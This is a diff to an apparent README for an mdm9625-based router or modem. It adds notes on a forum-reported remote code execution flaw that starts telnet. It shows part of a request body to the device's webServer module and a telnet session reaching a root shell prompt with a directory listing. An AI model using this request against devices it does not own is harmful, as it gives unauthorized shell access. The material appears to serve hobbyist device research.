@@ -1,3 +1,5 @@
+## RCE
+
 4PDA forum members found a RCE to start telnet on the device. We need to write a script to start telnet and gain shellaccess. Maybe we can do a rust implementation.
 
 ```
@@ -50,4 +52,23 @@ Request body:
 {"token":"Ваше значение token","module":"webServer","action":1,"language":"en"}
 
 13. Click Send . 
+```
+
+## Output accessing telnet
+
+```
+> telnet 192.168.0.1
+Trying 192.168.0.1...
+Connected to 192.168.0.1.
+Escape character is '^]'.
+
+OpenEmbedded Linux mdm9625
+
+
+msm 20160330 mdm9625
+
+/ # ls
+WEBSERVER   boot        cache       etc         lib         lost+found  misc        proc        sdcard      sys         usr         www
+bin         build.prop  dev         home        linuxrc     media       mnt         sbin        share       tmp         var
+
 ```
